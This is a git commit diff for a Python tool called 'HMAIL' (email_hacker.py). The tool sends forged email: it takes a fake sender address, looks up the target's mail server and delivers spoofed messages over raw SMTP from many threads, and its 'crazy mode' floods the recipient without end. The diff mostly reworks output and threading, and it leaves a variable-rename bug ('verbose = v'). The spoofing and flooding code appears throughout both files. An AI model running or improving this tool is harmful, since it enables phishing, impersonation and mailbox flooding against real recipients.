5cd61da8885ef6082d1e7ca7d7f8d379509bba03
Macr0phag3 <997334636@qq.com>
2018-10-01 00:16:20 +0800

    upload latest code

--- email_hacker.py
+++ email_hacker.py
@@ -26,6 +26,7 @@ class FakeEmail:
         self.timeout = timeout
         self.SMTP_addr = SMTP_addr
         self.quit_flag = 1
+        self.succ_num = 0
 
     def Connect(self):
         self.sk = socket.socket()
@@ -43,23 +44,23 @@ class FakeEmail:
         for result in msg.split(u"\r\n"):
             try:
                 self.sk.sendall((result+u"\r\n").encode("utf8"))
-                Print(result, threshold=1, color=u"yellow", sign=u"=> ")
+                Print(result, threshold=2, color=u"yellow", sign=u"=> ")
             except Exception as e:
-                Print(str(e), threshold=0, color=u"red", sign=u"=> ")
+                Print(str(e), threshold=0, color=u"red", sign=u"=> ", id=self.id)
                 return 0
         return 1
 
-    def Recv(self, check=u"", threshold=1):
+    def Recv(self, check=u"", threshold=2):
         try:
             data = [i.decode(u"utf8") for i in self.sk.recv(1024).split(b"\r\n") if i]
             assert data
         except AssertionError:
             if not check:
-                Print(u"recv empty answer", threshold=0, color=u"red", sign=u"<= ")
+                Print(u"recv empty answer", threshold=0, color=u"red", sign=u"<= ", id=self.id)
             return (0, u"recv empty answer")
         except Exception as e:
             if not check:
-                Print(str(e), threshold=0, color=u"red", sign=u"<= ")
+                Print(str(e), threshold=0, color=u"red", sign=u"<= ", id=self.id)
 
             return (0, str(e))
 
@@ -67,7 +68,7 @@ class FakeEmail:
             return (0, data[-1])
 
         if any([i for i in range(400, 600) if data[-1][:3] == str(i)]):
-            Print(data[-1], threshold=0, color=u"red", sign=u"<= ")
+            Print(data[-1], threshold=0, color=u"red", sign=u"<= ", id=self.id)
             return (0, data[-1])
 
         for result in data:
@@ -75,17 +76,17 @@ class FakeEmail:
 
         return (1, data[-1])
 
-    def Attack(self, snum):
-        global succ_num, failed_num, quit_flag, threads_alive
+    def Attack(self, id):
+        global succ_num, failed_num, quit_flag, threads_alive, Data
 
+        self.id = id
         while quit_flag and self.quit_flag:
             check_connect = self.Connect()
             if not check_connect[0]:
                 Print(u"creating connection failed: "+u"I just got the answer: '%s' from %s" % (check_connect[1], self.SMTP_addr),
-                      threshold=0, color=u"red", sign=u"[X]", flag=0)
+                      threshold=0, color=u"red", sign=u"[X]", flag=0, id=self.id)
                 self.sk.close()
                 failed_num += 1
-
                 if crazy_mode:
                     continue
                 else:
@@ -104,7 +105,7 @@ class FakeEmail:
                 if not (self.Send(u"mail from:<%s>" % self.from_addr) and self.Recv()[0]) or\
                         not (self.Send(u"rcpt to:<%s>" % self.to_addr) and self.Recv()[0]) or\
                         not (self.Send(u"data") and self.Recv()[0]):
-                    # self.sk.close()
+
                     failed_num += 1
                     if not crazy_mode:
                         self.quit_flag = 0
@@ -120,8 +121,10 @@ class FakeEmail:
                     result = self.Recv(threshold=0, check=u"250")
                     if result[0]:
                         succ_num += 1
+                        self.succ_num += 1
+                        Data[id] = PutColor(self.succ_num, "cyan")
                     else:
-                        Print(result[1], threshold=0, color=u"red", sign=u"<= ")
+                        Print(result[1], threshold=0, color=u"red", sign=u"<= ", id=self.id)
                         failed_num += 1
                 else:
                     failed_num += 1
@@ -132,7 +135,7 @@ class FakeEmail:
                     sleep(random.random()*1.5)
 
         Print(u"all done", sign=u"  [*]")
-        threads_alive[snum] = 0
+        threads_alive[id] = 0
         return self.sk.close()
 
 
@@ -151,17 +154,40 @@ def PutColor(string, color):
     return u"\033[40;1;%s;40m%s\033[0m" % (colors[color], string)
 
 
-def Print(string, threshold=2, color=u"gray", sign=u"  [-]", flag=1):
-    if verbose < threshold:
+def superPrint():
+    Lock.acquire()
+
+    for index in Indicator("attacking..."):
+        for i, data in enumerate(Data):
+            print("\033[K\r%s%s" % (PutColor("No.%d: " % i, "white"),  data))
+
+        print(PutColor("\r\033[K[*]", "green")+PutColor(index, "white")+"\033[1A")
+        print("\033[%dA" % (len(Data)+1))
+        sleep(0.1)
+
+    for i, data in enumerate(Data):
+        print("\033[K\r%s%s" % (PutColor("No.%d: " % i, "white"),  data))
+
+    Lock.release()
+
+
+def Print(string, threshold=3, color=u"gray", sign=u"  [-]", flag=1, id=-1):
+    global Data
+
+    if verbose < threshold or (verbose == 0 and threshold > -1):
+        if id != -1:
+            Data[id] = PutColor(string, color)
+        # else:
+        #    Data[id] = PutColor(Data[id], "cyan")
         return
 
     str_color = u"gray" if color == u"gray" else u"white"
     string = PutColor(sign, color)+PutColor(string, str_color)
-    if verbose > 1 and threshold < 2 and flag:
+    if verbose > 2 and threshold < 3 and flag:
         string = "  [-]"+string
 
     if Lock.acquire():
-        print(string)
+        print("\r"+string)
         Lock.release()
 
 
@@ -185,83 +211,129 @@ def DNSQuery(to_addr):
     return SMTP_addr
 
 
-def Launcher(multi_num):
-    if 0 < multi_num < 2:
-        client = FakeEmail(to_addr, from_addr, SMTP_addr)
-        client.Attack(0)
-    else:
-        threads = []
-        for i in range(multi_num):
-            client = FakeEmail(to_addr, from_addr, SMTP_addr=SMTP_addr)
-            t = threading.Thread(target=client.Attack, args=(i,))
-            t.start()
-            threads.append(t)
+def Launcher():
+    if not verbose:
+        threading.Thread(target=superPrint).start()
 
-        if not crazy_mode:
-            for t in threads:
-                t.join()
+    threads = []
+    for id in range(threads_num):
+        client = FakeEmail(to_addr, from_addr, SMTP_addr=SMTP_addr)
+        t = threading.Thread(target=client.Attack, args=(id,))
+        t.start()
+        threads.append(t)
+
+    if not crazy_mode:
+        for t in threads:
+            t.join()
+    else:
+        for i in Indicator("attacking..."):
+            Print(i+"\033[1A", color="green", threshold=0, flag=0, sign="\033[K[*]")
+            sleep(0.1)
+
+
+def Indicator(string, index=0):
+    while any(threads_alive) and ver == "go" and print_flag:
+        index = (index+1) % len(string)
+        yield string[:index]+string[index].upper()+string[index+1:]
 
 
 def quit(signum, frame):
-    global quit_flag
+    global quit_flag, print_flag
 
+    print_flag = 0
+    Lock.acquire()
+    Lock.release()
+    print_flag = 1
     quit_flag = 0
-    while any(threads_alive) and threads_num != 1:
-        pass
+    for i in Indicator("stopping..."):
+        Print(i+"\033[1A", color="yellow", threshold=-1, flag=0, sign="\033[K[!]")
+        sleep(0.1)
 
-    print(u"\n%s %s" % (PutColor(u"[*]success:", u"green"), succ_num))
-    print(u"%s %s\n" % (PutColor(u"[!]failed:", u"red"), failed_num))
-    print(PutColor(random.choice([
-        u"Goodbye", u"Have a nice day",
-        u"See you later", u"Bye",
-        u"Farewell", u"Cheerio",
+    Print(u"%s %s" % (u"success:", succ_num), threshold=-1,
+          color=u"green", flag=0, sign="\n"*(crazy_mode == True)+"\n[*]")
+    Print(u"%s %s\n" % (u"failed:", failed_num), threshold=-1, color=u"red", flag=0, sign="[!]")
+
+    print("\033[?25h"+PutColor(random.choice([
+        u"Goodbye", u"Have a nice day", u"See you later",
+        u"Farewell", u"Cheerio", u"Bye",
     ]), u"white"))
     sys.exit()
 
 
-succ_num = 0
-failed_num = 0
-quit_flag = 1
+def show_logo():
+    print("\033c\033[?25l")
+    print("-"*45+"""
+
+██╗  ██╗███╗   ███╗ █████╗ ██╗██╗
+██║  ██║████╗ ████║██╔══██╗██║██║ by Tr0y
+███████║██╔████╔██║███████║██║██║ v2.0
+██╔══██║██║╚██╔╝██║██╔══██║██║██║
+██║  ██║██║ ╚═╝ ██║██║  ██║██║███████╗
+╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝
+"""+"-"*45)
+
+
+show_logo()
 signal.signal(signal.SIGINT, quit)
 signal.signal(signal.SIGTERM, quit)
 parser = argparse.ArgumentParser()
-parser.add_argument(u"-faddr", u"--from_address", help=u"fake from address", required=True)
+parser.add_argument(u"-faddr", u"--from_address",
+                    help=u"fake from address", required=True)
+
 parser.add_argument(u"-taddr", u"--to_address",
                     help=u"the address you want to delivery", required=True)
+
 parser.add_argument(u"-tnum", u"--threads_num",
                     help=u"how many threads you want", default=1, type=int)
-parser.add_argument(u"-v", u"--verbose", help=u"verbose level", default=-1, type=int)
+
+parser.add_argument(u"-v", u"--verbose",
+                    help=u"verbose level", default=-1, type=int)
+
 parser.add_argument(u"-c", u"--crazy_mode",
-                    help=u"Keep sending fake email (** Use with caution **)", default=0, type=int)
+                    help=u"Keep sending fake email (** Use with caution **)", action='store_true', default=False)
 args = parser.parse_args()
 
+succ_num = failed_num = 0
+quit_flag = print_flag = 1
+ver = -1
 from_addr = args.from_address
 to_addr = args.to_address
 threads_num = args.threads_num if args.threads_num > 0 else 1
 verbose = args.verbose
 crazy_mode = args.crazy_mode
 threads_alive = [1]*threads_num
-
+Data = ['0']*threads_num
 Lock = threading.Lock()
+
 if verbose == -1:
-    verbose = 0 if (threads_num > 1 or crazy_mode) else 1
-else:
-    if (threads_num > 1 or crazy_mode) and verbose:
-        Print(u"It's not recommended to enable output(let verbose>1) in multi-threaded mode, change it to 0(let verbose=0)?",
-              color=u"yellow", threshold=0, sign=u"[!]WARNING: ")
-        if vars(__builtins__).get('raw_input', input)(u"  [-]type no/[yes]: ") != "no":
-            verbose = 0
-            Print(u"as you wish\n", color=u"white", threshold=0, sign=u"  [*]")
-        else:
-            Print(u"in a mess, of course\n", color=u"yellow", threshold=0, sign=u"  [!]")
+    verbose = 0 if crazy_mode else 2 if threads_num == 1 else 1
+
+elif threads_num > 1:
+    if crazy_mode and verbose > 1:
+        ver = 0
+        Print(u"""...It's not recommended to enable so many output(let verbose>0)
+...in the multi-threaded mode with crazy mode,
+...change it to 0? (let verbose=0)""",
+              color=u"yellow", threshold=0, sign=u"[!]WARNING: \n", flag=0)
+    elif verbose > 1:
+        ver = 1
+        Print(u"""...It's not recommended to enable so many output(let verbose>1)
+...in the multi-threaded mode,
+...change it to 1? (let verbose=1)""",
+              color=u"yellow", threshold=0, sign=u"[!]WARNING: \n", flag=0)
+
+if ver != -1:
+    if vars(__builtins__).get('raw_input', input)(PutColor(u"[!]", "yellow")+PutColor("type [yes]/no: ", "white")) != "no":
+        verbose = v
+        Print(u"as you wish\n", color=u"green", threshold=0, sign=u"[*]", flag=0)
+    else:
+        Print(u"in a mess, of course\n", color=u"yellow", threshold=0, sign=u"[!]", flag=0)
 
 SMTP_addr = DNSQuery(to_addr)
-
 if SMTP_addr:
-    Launcher(threads_num)
-
-if crazy_mode and threads_num != 1:
-    while 1:
-        pass
+    ver = "go"
+    Launcher()
+else:
+    threads_alive = [0]
 
 quit(0, 0)
--- email_hacker_unfinished.py
+++ email_hacker_unfinished.py
@@ -26,6 +26,7 @@ class FakeEmail:
         self.timeout = timeout
         self.SMTP_addr = SMTP_addr
         self.quit_flag = 1
+        self.succ_num = 0
 
     def Connect(self):
         self.sk = socket.socket()
@@ -45,7 +46,7 @@ class FakeEmail:
                 self.sk.sendall((result+u"\r\n").encode("utf8"))
                 Print(result, threshold=2, color=u"yellow", sign=u"=> ")
             except Exception as e:
-                Print(str(e), threshold=0, color=u"red", sign=u"=> ")
+                Print(str(e), threshold=0, color=u"red", sign=u"=> ", id=self.id)
                 return 0
         return 1
 
@@ -55,11 +56,11 @@ class FakeEmail:
             assert data
         except AssertionError:
             if not check:
-                Print(u"recv empty answer", threshold=0, color=u"red", sign=u"<= ")
+                Print(u"recv empty answer", threshold=0, color=u"red", sign=u"<= ", id=self.id)
             return (0, u"recv empty answer")
         except Exception as e:
             if not check:
-                Print(str(e), threshold=0, color=u"red", sign=u"<= ")
+                Print(str(e), threshold=0, color=u"red", sign=u"<= ", id=self.id)
 
             return (0, str(e))
 
@@ -67,7 +68,7 @@ class FakeEmail:
             return (0, data[-1])
 
         if any([i for i in range(400, 600) if data[-1][:3] == str(i)]):
-            Print(data[-1], threshold=0, color=u"red", sign=u"<= ")
+            Print(data[-1], threshold=0, color=u"red", sign=u"<= ", id=self.id)
             return (0, data[-1])
 
         for result in data:
@@ -75,14 +76,15 @@ class FakeEmail:
 
         return (1, data[-1])
 
-    def Attack(self, snum):
-        global succ_num, failed_num, quit_flag, threads_alive
+    def Attack(self, id):
+        global succ_num, failed_num, quit_flag, threads_alive, Data
 
+        self.id = id
         while quit_flag and self.quit_flag:
             check_connect = self.Connect()
             if not check_connect[0]:
                 Print(u"creating connection failed: "+u"I just got the answer: '%s' from %s" % (check_connect[1], self.SMTP_addr),
-                      threshold=0, color=u"red", sign=u"[X]", flag=0)
+                      threshold=0, color=u"red", sign=u"[X]", flag=0, id=self.id)
                 self.sk.close()
                 failed_num += 1
                 if crazy_mode:
@@ -103,7 +105,7 @@ class FakeEmail:
                 if not (self.Send(u"mail from:<%s>" % self.from_addr) and self.Recv()[0]) or\
                         not (self.Send(u"rcpt to:<%s>" % self.to_addr) and self.Recv()[0]) or\
                         not (self.Send(u"data") and self.Recv()[0]):
-                    # self.sk.close()
+
                     failed_num += 1
                     if not crazy_mode:
                         self.quit_flag = 0
@@ -119,8 +121,10 @@ class FakeEmail:
                     result = self.Recv(threshold=0, check=u"250")
                     if result[0]:
                         succ_num += 1
+                        self.succ_num += 1
+                        Data[id] = PutColor(self.succ_num, "cyan")
                     else:
-                        Print(result[1], threshold=0, color=u"red", sign=u"<= ")
+                        Print(result[1], threshold=0, color=u"red", sign=u"<= ", id=self.id)
                         failed_num += 1
                 else:
                     failed_num += 1
@@ -131,7 +135,7 @@ class FakeEmail:
                     sleep(random.random()*1.5)
 
         Print(u"all done", sign=u"  [*]")
-        threads_alive[snum] = 0
+        threads_alive[id] = 0
         return self.sk.close()
 
 
@@ -150,22 +154,41 @@ def PutColor(string, color):
     return u"\033[40;1;%s;40m%s\033[0m" % (colors[color], string)
 
 
+def superPrint():
+    Lock.acquire()
+
+    for index in Indicator("attacking..."):
+        for i, data in enumerate(Data):
+            print("\033[K\r%s%s" % (PutColor("No.%d: " % i, "white"),  data))
+
+        print(PutColor("\r\033[K[*]", "green")+PutColor(index, "white")+"\033[1A")
+        print("\033[%dA" % (len(Data)+1))
+        sleep(0.1)
+
+    for i, data in enumerate(Data):
+        print("\033[K\r%s%s" % (PutColor("No.%d: " % i, "white"),  data))
+
+    Lock.release()
+
+
 def Print(string, threshold=3, color=u"gray", sign=u"  [-]", flag=1, id=-1):
-    if verbose < threshold:
+    global Data
+
+    if verbose < threshold or (verbose == 0 and threshold > -1):
+        if id != -1:
+            Data[id] = PutColor(string, color)
+        # else:
+        #    Data[id] = PutColor(Data[id], "cyan")
         return
 
-    if not verbose:
-        pass
+    str_color = u"gray" if color == u"gray" else u"white"
+    string = PutColor(sign, color)+PutColor(string, str_color)
+    if verbose > 2 and threshold < 3 and flag:
+        string = "  [-]"+string
 
-    else:
-        str_color = u"gray" if color == u"gray" else u"white"
-        string = PutColor(sign, color)+PutColor(string, str_color)
-        if verbose > 2 and threshold < 3 and flag:
-            string = "  [-]"+string
-
-        if Lock.acquire():
-            print("\r"+string)
-            Lock.release()
+    if Lock.acquire():
+        print("\r"+string)
+        Lock.release()
 
 
 def DNSQuery(to_addr):
@@ -189,53 +212,68 @@ def DNSQuery(to_addr):
 
 
 def Launcher():
+    if not verbose:
+        threading.Thread(target=superPrint).start()
+
     threads = []
-    for i in range(threads_num):
+    for id in range(threads_num):
         client = FakeEmail(to_addr, from_addr, SMTP_addr=SMTP_addr)
-        t = threading.Thread(target=client.Attack, args=(i,))
+        t = threading.Thread(target=client.Attack, args=(id,))
         t.start()
         threads.append(t)
 
     if not crazy_mode:
         for t in threads:
             t.join()
-
     else:
         for i in Indicator("attacking..."):
-            Print(i+"\033[1A", color="green", threshold=0, flag=0, sign="\033[?25l\033[K[!]")
+            Print(i+"\033[1A", color="green", threshold=0, flag=0, sign="\033[K[*]")
             sleep(0.1)
 
 
 def Indicator(string, index=0):
-    while any(threads_alive) and v == "go":
+    while any(threads_alive) and ver == "go" and print_flag:
         index = (index+1) % len(string)
         yield string[:index]+string[index].upper()+string[index+1:]
 
 
 def quit(signum, frame):
-    global quit_flag
+    global quit_flag, print_flag
 
+    print_flag = 0
+    Lock.acquire()
+    Lock.release()
+    print_flag = 1
     quit_flag = 0
-    '''
-    Print("Stopping %s\033[1A" %
-          (["\\", "|", "/", "-"][circle]), color="yellow", threshold=0, flag=0, sign="\033[?25l\033[K[!]")
-    circle = (circle+1) % 4
-    '''
     for i in Indicator("stopping..."):
-        Print(i+"\033[1A", color="yellow", threshold=0, flag=0, sign="\033[?25l\033[K[!]")
+        Print(i+"\033[1A", color="yellow", threshold=-1, flag=0, sign="\033[K[!]")
         sleep(0.1)
 
-    Print(u"%s %s" % (u"success:", succ_num), threshold=0,
-          color=u"green", flag=0, sign="\n"*(crazy_mode == True)+"\n\033[?25h[*]")
-    Print(u"%s %s\n" % (u"failed:", failed_num), threshold=0, color=u"red", flag=0, sign="[!]")
+    Print(u"%s %s" % (u"success:", succ_num), threshold=-1,
+          color=u"green", flag=0, sign="\n"*(crazy_mode == True)+"\n[*]")
+    Print(u"%s %s\n" % (u"failed:", failed_num), threshold=-1, color=u"red", flag=0, sign="[!]")
 
-    print(PutColor(random.choice([
+    print("\033[?25h"+PutColor(random.choice([
         u"Goodbye", u"Have a nice day", u"See you later",
         u"Farewell", u"Cheerio", u"Bye",
     ]), u"white"))
     sys.exit()
 
 
+def show_logo():
+    print("\033c\033[?25l")
+    print("-"*45+"""
+
+██╗  ██╗███╗   ███╗ █████╗ ██╗██╗
+██║  ██║████╗ ████║██╔══██╗██║██║ by Tr0y
+███████║██╔████╔██║███████║██║██║ v2.0
+██╔══██║██║╚██╔╝██║██╔══██║██║██║
+██║  ██║██║ ╚═╝ ██║██║  ██║██║███████╗
+╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝
+"""+"-"*45)
+
+
+show_logo()
 signal.signal(signal.SIGINT, quit)
 signal.signal(signal.SIGTERM, quit)
 parser = argparse.ArgumentParser()
@@ -255,36 +293,36 @@ parser.add_argument(u"-c", u"--crazy_mode",
                     help=u"Keep sending fake email (** Use with caution **)", action='store_true', default=False)
 args = parser.parse_args()
 
-succ_num = 0
-failed_num = 0
-quit_flag = 1
+succ_num = failed_num = 0
+quit_flag = print_flag = 1
+ver = -1
 from_addr = args.from_address
 to_addr = args.to_address
 threads_num = args.threads_num if args.threads_num > 0 else 1
 verbose = args.verbose
 crazy_mode = args.crazy_mode
 threads_alive = [1]*threads_num
+Data = ['0']*threads_num
 Lock = threading.Lock()
 
-v = -1
 if verbose == -1:
-    verbose = 2 if threads_num == 1 else 0 if crazy_mode else 1
+    verbose = 0 if crazy_mode else 2 if threads_num == 1 else 1
 
 elif threads_num > 1:
     if crazy_mode and verbose > 1:
-        v = 0
+        ver = 0
         Print(u"""...It's not recommended to enable so many output(let verbose>0)
 ...in the multi-threaded mode with crazy mode,
 ...change it to 0? (let verbose=0)""",
               color=u"yellow", threshold=0, sign=u"[!]WARNING: \n", flag=0)
     elif verbose > 1:
-        v = 1
+        ver = 1
         Print(u"""...It's not recommended to enable so many output(let verbose>1)
 ...in the multi-threaded mode,
 ...change it to 1? (let verbose=1)""",
               color=u"yellow", threshold=0, sign=u"[!]WARNING: \n", flag=0)
 
-if v != -1:
+if ver != -1:
     if vars(__builtins__).get('raw_input', input)(PutColor(u"[!]", "yellow")+PutColor("type [yes]/no: ", "white")) != "no":
         verbose = v
         Print(u"as you wish\n", color=u"green", threshold=0, sign=u"[*]", flag=0)
@@ -293,7 +331,7 @@ if v != -1:
 
 SMTP_addr = DNSQuery(to_addr)
 if SMTP_addr:
-    v = "go"
+    ver = "go"
     Launcher()
 else:
     threads_alive = [0]
